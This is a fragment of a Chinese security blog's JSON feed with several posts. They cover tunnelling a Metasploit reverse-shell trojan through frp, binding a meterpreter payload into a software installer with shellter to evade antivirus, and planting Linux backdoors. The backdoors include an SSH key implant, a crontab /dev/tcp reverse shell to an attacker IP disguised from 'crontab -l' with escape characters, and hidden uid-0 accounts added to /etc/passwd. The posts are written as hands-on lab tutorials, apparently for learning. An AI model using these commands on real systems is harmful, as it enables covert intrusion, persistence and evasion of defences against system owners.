配置。</p>\n<p><code>vim frpc.ini</code> <br />\n 内容如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = 106.15.52.194</span><br><span class=\"line\">server_port = 7777</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6666</span><br><span class=\"line\">use_compression = true</span><br></pre></td></tr></table></figure><br />\n 相关 <strong>解释</strong> 如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png\" alt=\"image-20230426011350366\" /></p>\n<h3 id=\"运行-2\"><a class=\"anchor\" href=\"#运行-2\">#</a> 运行</h3>\n<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>\n<ul>\n<li>命令行输入： <code>./frpc -c frpc.ini</code>\n<ul>\n<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>\n</ul>\n</li>\n<li>开机自启动：\n<ul>\n<li>服务目录 <strong>新建并编辑</strong> 文件： <code>vim /lib/systemd/system/frp.service</code></li>\n<li>填入以下内容：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Frp Client Service</span><br><span class=\"line\">After=network.target remote-fs.target nss-lookup.target</span><br><span class=\"line\">Wants=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">ExecStart=/root/frp/frpc -c /root/frp/frpc.ini</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">RestartSec=20s</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>\n<li>启动 <strong>frpc</strong> 服务： <code>systemctl start frp</code> <br />\n（最后的  <code>frp</code>  名称取决于上一步新建的文件名  <code>frp.service</code> ）</li>\n<li>打开 <strong>frpc</strong> 服务自启动  <code>systemctl enable frp</code> <br />\n<strong> [注意]：</strong>\n<ul>\n<li>如果要重启应用： <code>systemctl restart frp</code></li>\n<li>如果要停止应用： <code>systemctl stop frp</code></li>\n<li>如果要查看 <strong>frpc</strong> 的日志： <code>systemctl status frp</code></li>\n<li>权限不够，记得加  <code>sudo</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>服务文件</strong> 重要内容注释 如下图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png\" alt=\"image-20230426011356634\" /></p>\n<h2 id=\"ssh-连接测试\"><a class=\"anchor\" href=\"#ssh-连接测试\">#</a> SSH 连接测试</h2>\n<ul>\n<li>命令行  <code>ssh root@x.x.x.x -p 6666</code> <br />\n（<strong>root</strong> 用户登录到 <strong>云服务器 x.x.x.x</strong> 的 <strong>6666</strong> 端口）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png\" alt=\"\" /></li>\n<li>Xshell 创建新会话，具体内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png\" alt=\"image-20230426011410382\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png\" alt=\"image-20230426011417120\" /><br />\n&lt;br&gt;<br />\n<strong>Xshell  连接成功</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png\" alt=\"image-20230426011424294\" /></li>\n</ul>\n<h2 id=\"msf-渗透攻击测试\"><a class=\"anchor\" href=\"#msf-渗透攻击测试\">#</a> msf 渗透攻击测试</h2>\n<p>双击打开 刚刚建立的 <strong>Xshell 新会话</strong>（ frp ）.</p>\n<h3 id=\"frpc-添加新配置\"><a class=\"anchor\" href=\"#frpc-添加新配置\">#</a> frpc 添加新配置</h3>\n<p>输入命令： <code>vim frpc.ini</code> ，编辑 <strong>frpc</strong> 配制文件，<br />\n在文件末尾 <strong>添加</strong>：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[msf]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 4444</span><br><span class=\"line\">remote_port = 2333 </span><br></pre></td></tr></table></figure><br />\n 配置内容的 <strong>含义</strong> 与 <strong>[ssh]</strong> 类似，解释如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png\" alt=\"image-20230426011431000\" /></p>\n<h3 id=\"msf-生成木马\"><a class=\"anchor\" href=\"#msf-生成木马\">#</a> msf 生成木马</h3>\n<p>与连接 <strong>本地的 shell</strong> 生成木马不同，<br />\n因为我们要使用 <strong>frp 穿透内网</strong> 连接的 shell ，去 <strong>监听木马反弹</strong>的 shell，<br />\n所以我们 <strong>生成木马</strong> 时，设置的 LHOST、LPORT 应当是 <strong>云服务器</strong> 的对应数据。<br />\n（直接用内网测试的时候，LHOST、LPORT 填的是 <strong>本地虚拟机</strong> 的相关数据）</p>\n<p>用 <strong>msf</strong> 生成 <strong>windows</strong> 系统的 <strong>反向 shell</strong> 木马：<br />\n <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &gt; qq.exe</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png\" alt=\"image-20230426011437323\" /><br />\n 成功生成木马文件：<strong>qq.exe</strong></p>\n<h3 id=\"msf-监听反弹的-shell\"><a class=\"anchor\" href=\"#msf-监听反弹的-shell\">#</a> msf 监听反弹的 shell</h3>\n<blockquote>\n<p>（确定 frps 、frpc 服务均已在后台运行）<br />\n（事先上传 qq.exe 到测试的靶机，本文用 \tWin7_x64 虚拟机替代）</p>\n</blockquote>\n<blockquote>\n<p>关于<strong>上传</strong>：Kali 虚拟机 开启 <strong>Apache2</strong> 服务，Win7_x64 虚拟机 内网访问下载：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png\" alt=\"\" /></p>\n</blockquote>\n<ol>\n<li><code>msfconsole</code>\n<ul>\n<li>打开 <strong>msf</strong></li>\n</ul>\n</li>\n<li><code>use exploit/multi/handler</code>\n<ul>\n<li>选择使用的 exploit</li>\n</ul>\n</li>\n<li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>\n<ul>\n<li>设置 PAYLOAD （生成木马时使用的）</li>\n</ul>\n</li>\n<li><code>set LHOST 127.0.0.1</code>\n<ul>\n<li>设置 LHOST 为本地 IP</li>\n</ul>\n</li>\n<li><code>set LPORT 4444</code>\n<ul>\n<li>设置 LPORT 为转发的本地端口 4444</li>\n</ul>\n</li>\n<li>run\n<ul>\n<li>开始监听</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<p>（先让 <strong>msf</strong> 开始监听，再双击运行上传的木马文件）</p>\n</blockquote>\n<p>演示如图所示：</p>\n<ul>\n<li>双击 <strong>运行木马</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png\" alt=\"image-20230426011447735\" /><br />\n&lt;br&gt;</li>\n<li>msf <strong>开始监听</strong> &amp; 成功获得 meterpreter <strong>shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png\" alt=\"image-20230426011457351\" /></li>\n</ul>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "frp"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/",
            "title": "免杀捆绑工具 shellter 的安装及使用",
            "date_published": "2022-04-16T10:10:24.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>shellter</strong> 是一个<strong>捆绑</strong>工具，采用动态 <strong>shellcode</strong> 注入 的方式，将 <strong>shellcode</strong> 注入到其它程序中，达到<strong>免杀</strong>的效果，躲避杀软的查杀。</p>\n</div>\n<h2 id=\"shellter-安装\"><a class=\"anchor\" href=\"#shellter-安装\">#</a> shellter 安装</h2>\n<ol>\n<li>添加 <strong>i386 32 位</strong> 架构支持、更新 <strong>apt</strong>、安装 <strong>wine</strong> 依赖：\n<ul>\n<li><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32</code></li>\n</ul>\n</li>\n<li>安装 <strong>shellter</strong>：\n<ul>\n<li><code>apt install shellter</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png\" alt=\"image-20230426011840045\" /></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"shellter-使用\"><a class=\"anchor\" href=\"#shellter-使用\">#</a> shellter 使用</h2>\n<blockquote>\n<p>使用 shellter 捆绑 Meterpreter_Reverse_TCP</p>\n</blockquote>\n<p><strong>捆绑步骤：</strong></p>\n<ol>\n<li>命令行输入  <code>shellter</code>  打开工具</li>\n<li>输入  <code>A</code>  或者  <code>a</code> ，选择 <strong>自动模式</strong>；</li>\n<li><code>PE Target:</code>  后输入要进行 <strong>捆绑</strong> 的 <strong>文件路径</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png\" alt=\"image-20230426011919683\" /><br />\n&lt;br&gt;</li>\n<li>输入 <code>Y</code> ，进入 <strong>隐形模式</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png\" alt=\"image-20230426011923428\" /><br />\n&lt;br&gt;</li>\n<li>输入 <code>L</code> ，使用 <strong>payload</strong> 攻击模块列表（即上面的 <strong>1~7</strong> ）</li>\n<li><strong>payload</strong> 编号选择  <code>1</code>  ，使用 Meterpreter_Reverse_TCP 攻击<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png\" alt=\"image-20230426011927372\" /><br />\n&lt;br&gt;</li>\n<li>分别输入监听端的 <strong>IP</strong>、<strong>端口号</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png\" alt=\"image-20230426011931101\" /><br />\n&lt;br&gt;</li>\n<li>按  <code>[Enter]</code>  退出 <strong>shellter</strong> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png\" alt=\"image-20230426011934700\" /></li>\n</ol>\n<p>&lt;br&gt;</p>\n<p><strong>[关于生成的文件]</strong></p>\n<blockquote>\n<p><strong>捆绑完毕</strong>的文件 会代替 <strong>原文件</strong> ，即出现在 原文件目录 下，<strong>名字相同</strong><br />\n而<strong>原文件</strong>会 <strong>备份</strong> 在目录  <code>/root/Shellter_Backups/</code>  ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png\" alt=\"image-20230426011938517\" /></p>\n</blockquote>\n<h2 id=\"利用-免杀效果\"><a class=\"anchor\" href=\"#利用-免杀效果\">#</a> 利用 &amp; 免杀效果</h2>\n<h3 id=\"利用\"><a class=\"anchor\" href=\"#利用\">#</a> 利用</h3>\n<ol>\n<li>上传到 <strong>Win7_x64</strong> 虚拟机，</li>\n<li><strong>Kali_Linux</strong> 虚拟机打开 <strong>msf</strong> （命令  <code>msfconsole</code> ），监听<strong>反弹 shell</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>反弹 shell</strong> 成功！<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png\" alt=\"image-20230426011944783\" /></p>\n<h3 id=\"免杀效果\"><a class=\"anchor\" href=\"#免杀效果\">#</a> 免杀效果</h3>\n<p>我的 <strong>Win7_x64 虚拟机</strong> 安装了 <strong>360 全家桶</strong>，</p>\n<p>但是 <strong>静态检测</strong> 貌似并没有查出 <strong>木马文件</strong>～</p>\n<p>运行木马程序，并成功获得 <strong>meterpreter</strong> 的 <strong>shell</strong> 之后，<strong>360</strong> 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？</p>\n<p>大概一分钟之后，才提示有木马：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png\" alt=\"image-20230426011949574\" /><br />\n（实际上这个时间足够黑客 <strong>迁移进程</strong> 并 <strong>布置后门</strong> 了)</p>\n<p>当然，如果你的电脑以前中过这个毒，<strong>360</strong> 会第一时间反应过来<br />\n（但这要是<strong>还没反应</strong>，<strong>360</strong> 就该进回收站了）</p>\n<p>然后看看 <strong>virustotal</strong> 的检测情况（<strong>31 / 70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==\">检测报告 传送门 1</span><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png\" alt=\"image-20230426011954090\" /></p>\n<p><em><strong>对比 ：</strong></em><br />\n使用 同程序 同<strong> payload</strong>，用 <strong>msf</strong> 自带的捆绑手段生成的木马：<br />\n（命令： <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> ）</p>\n<p><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==\">检测报告 传送门 2</span><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png\" alt=\"image-20230426011958597\" /></p>\n<blockquote>\n<p>相比较而言，可以说 <strong>shellter</strong> 的捆绑<strong>免杀</strong>效果比 <strong>msf</strong> 好很多了。</p>\n</blockquote>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "shellter"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "title": "linux 服务器常见的留后门方式（二）",
            "date_published": "2022-04-02T15:36:35.000Z",
            "content_html": "<div class=\"note primary\">\n<p>整理好了搭环境的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==\">LINUX 后门复现环境搭建</span></p>\n</div>\n<p>攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的<strong>后门</strong>。其目的是，方便攻击者以后对该服务器进行持久性的攻击。</p>\n<p>其中，在 linux 服务器上留后门的常见技术，<strong>本文中会提及</strong>如下几种：</p>\n<ul>\n<li>SSH 公钥免密</li>\n<li>crontab 后门<br />\n...</li>\n</ul>\n<h2 id=\"ssh公钥免密\"><a class=\"anchor\" href=\"#ssh公钥免密\">#</a> SSH 公钥免密</h2>\n<p>简而言之，<strong>SSH 公钥免密</strong>就是，将<strong>攻击者</strong>生成的 <strong>ssh 公钥</strong>写到<strong>目标服务器</strong>的 <code>/root/.ssh/authorized_keys</code>  中（手动在目标机上完成注册），<br />\n然后<strong>攻击者</strong>就可以利用对应的<strong>私钥</strong>免密登录。</p>\n<p><strong>实现：</strong></p>\n<ol>\n<li>\n<p>使用 <strong>Xshell</strong> 的 工具 -&gt; 新建用户密钥生成向导，完成<strong> ssh 公钥、私钥</strong>的生成：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png\" alt=\"image-20230426010853712\" /><br />\n（填入密码)<br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>保存生成的公钥文件（id_rsa_2048.pub），传到<strong>目标服务器</strong>上，<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png\" alt=\"image-20230426010925673\" /><br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>寻找 <strong>authorized_keys</strong> 文件，命令 <code>find -name authorized_keys</code> ，<br />\n如果没有，就通过命令 <code>touch /root/.ssh/authorized_keys</code>  创建。<br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>命令 <code>ssh-keygen -t rsa</code>  开启免密登录功能，<br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>通过命令 <code>cat 公钥路径 &gt;&gt; /root/.ssh/authorized_keys</code>  把公钥写入到<strong> authorized_keys</strong>，完成注册<br />\n &lt;br&gt;</p>\n</li>\n<li>\n<p>修改文件权限 <code>chmod 600 ~/.ssh/authorized_keys</code> <br />\n <code>chmod 700 ~/.ssh</code> <br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>攻击者使用<strong> Xshell</strong> 生成的<strong>私钥</strong>和之前填写的<strong>密码</strong>，登录目标服务器<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png\" alt=\"image-20230426010955314\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png\" alt=\"image-20230426011015095\" /></p>\n</li>\n</ol>\n<h2 id=\"crontab后门\"><a class=\"anchor\" href=\"#crontab后门\">#</a> crontab 后门</h2>\n<p><strong>Crond</strong> 服务启动后，会<strong>定期</strong>（默认一分钟检查一次）检查它的配置文件中，是否有要执行的任务。<br />\n如果有，就会根据<strong>预先设定</strong>的<strong>定时任务规则</strong>自动执行该任务。<br />\ncrontab 是用来定期执行程序的命令，<br />\n我们可以通过<strong> crontab</strong> 命令制造定时后门：<br />\n <code>(crontab -l;echo '*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.158.132/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -</code></p>\n<p><strong>解释：</strong><br />\n <code>echo '*/60 * * * *'</code> ：设定每 60 分钟执行一次；<br />\n <code>exec 9&lt;&gt;/dev/tcp/192.168.158.132/2333</code> ：利用 bash 提供的功能，对 <code>/dev/tcp/</code>  开头的字符串进行<strong>解析</strong>，指定<strong>服务器 IP</strong> 为：192.168.158.132（<strong>攻击机</strong> IP），<strong>端口号</strong>为 2333，指定描述符为 9，建立网络连接；<br />\n <code>exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;</code> ：<strong>文件描述符</strong> 0：stdin，1：stdout，把标准输入输出<strong>都</strong>重定向到描述符 9；<br />\n <code>/bin/bash --noprofile -i</code> ：开一个 Shell。<br />\n其实就是利用 Bash <strong>反弹</strong>一个<strong> Shell</strong> 到指定的攻击者 IP</p>\n<p>（ubuntu 默认<strong>没开</strong> bash 的网络重定向选项，需要加上 <code>–enable-net-redirections</code>  重新编译 bash）</p>\n<p><strong>隐藏：</strong><br />\n但是这样的一个后门，管理员直接执行 <code>crontab -l</code>  就能看到我们设定的定时任务。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png\" alt=\"image-20230426011055514\" /><br />\n 这个命令其实是在读取  <code>/var/spool/cron/crontabs/root</code>  文件。<br />\n所以，我们可以利用 cat 的一个缺陷，使用一些<strong>转义字符</strong>，比如 \\r 回车符 \\n 换行符 \\f 换页符，来<strong>隐藏</strong>我们不想让管理员看到的命令：<br />\n <code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.158.132/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for </code> whoami <code>%100c\\n&quot;)|crontab -</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png\" alt=\"image-20230426011110789\" /> 但是，若是使用 <code>cat -A /var/spool/cron/crontabs/root</code>  还是可以看到我们隐藏的东西的。</p>\n",
            "tags": [
                "Backdoor",
                "Linux",
                "Kali"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "linux 服务器常见的留后门方式（一）",
            "date_published": "2022-04-02T15:35:57.000Z",
            "content_html": "<div class=\"note primary\">\n<p>整理好了搭环境的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==\">LINUX 后门复现环境搭建</span></p>\n</div>\n<p>攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的<strong>后门</strong>。其目的是，方便攻击者以后对该服务器进行持久性的攻击。</p>\n<p>其中，在 linux 服务器上留后门的常见技术，<strong>本文中会提及</strong>如下几种：</p>\n<ul>\n<li>增加用户账号</li>\n<li>破解用户密码</li>\n<li>放置 SUID Shell</li>\n<li>PAM 后门</li>\n<li>SSH 软链接后门<br />\n...</li>\n</ul>\n<h2 id=\"增加用户账号\"><a class=\"anchor\" href=\"#增加用户账号\">#</a> 增加用户账号</h2>\n<p><strong>前提</strong>：getshell，已获得服务器的 root 权限</p>\n<h3 id=\"uid0用户可远程登陆\"><a class=\"anchor\" href=\"#uid0用户可远程登陆\">#</a> uid=0 用户可远程登陆</h3>\n<p>可以通过下面这一行指令，增加一个<strong>超级用户账号</strong>：<br />\n <code>echo &quot;用户名:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code> <br />\n 然后通过： <code>passed 用户名</code> 命令，修改所设超级用户的密码</p>\n<h4 id=\"实现\"><a class=\"anchor\" href=\"#实现\">#</a> 实现：</h4>\n<p>输入命令：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png\" alt=\"image-20230426005018227\" /><br />\n（增加超级用户 backdoor）<br />\n然后通过 ssh 登录 backdoor 账户：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png\" alt=\"image-20230426005025313\" /><br />\n 可以看到已经是 root 权限了：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png\" alt=\"image-20230426005032317\" /></p>\n<p>原理：给服务器增加一个<strong> ID 为 0</strong> 的账号（因为<strong> root</strong> 的 ID 为 0）<br />\n我们可以通过 <code>vim /etc/passwd</code>  命令打开 passwd，所有用户名称与 ID 的对应关系都保存在这里。<br />\n在文件开头，能看到 root:<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png\" alt=\"image-20230426005041049\" /> 在文件的最后，我们能够找到刚刚添加的账号（backdoor）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png\" alt=\"image-20230426005048939\" /> 已禁止 uid=0 用户远程登陆</p>\n<p>管理员可以<strong>禁止 root 用户</strong>通过<strong> ssh</strong> 的方式，远程登录服务器。</p>\n<p><strong>禁止方法</strong>如下：<br />\n（首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）<br />\n <code>vim /etc/ssh/sshd_config</code>  打开 sshd_config 文件<br />\n找到  <code>PermitRootLogin</code> ，改为 no<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png\" alt=\"image-20230426005055500\" /> 然后重启 ssh 服务<br />\n此时再通过 xshell 远程登录 root 账户，就会被拒绝：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png\" alt=\"image-20230426005101801\" /></p>\n<p>如果遇到了禁用 uid=0 账户远程登录的情况，也可以增加一个<strong>普通用户</strong>：<br />\n <code>echo &quot;用户名:x:1000:1000::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code> <br />\n 道理都是一样的，可以观察到，我们使用的普通用户的 ID 就是 1000</p>\n<h3 id=\"无交互情况下添加账户\"><a class=\"anchor\" href=\"#无交互情况下添加账户\">#</a> 无交互情况下添加账户</h3>\n<p>所利用漏洞的不一样，会导致攻击者可能面临无法交互、没有回显的情况，<br />\n在这种情况下，使用前两种方法是困难的，先给出如下的方法：</p>\n<p>命令 <code>useradd 用户名 -u 0 -o -g root -G root</code>  以及 <code>echo &quot;密码&quot; | passwd --stdin 用户名</code> ，<br />\n若服务器基于<strong> Debian</strong>，即不能使用 --stdin 操作的话，第二条改用命令 <code>echo 用户名:密码 | chpasswd</code> ，或者粗暴地直接用 \\n 回车（因为 passwd 是需要<strong>输入两次</strong>密码的）： <code>echo &quot;密码\\n密码&quot; | passwd 用户名</code></p>\n<ul>\n<li>第一个命令：使用 useradd 命令增加用户，-u 设置用户 id 为 0（root 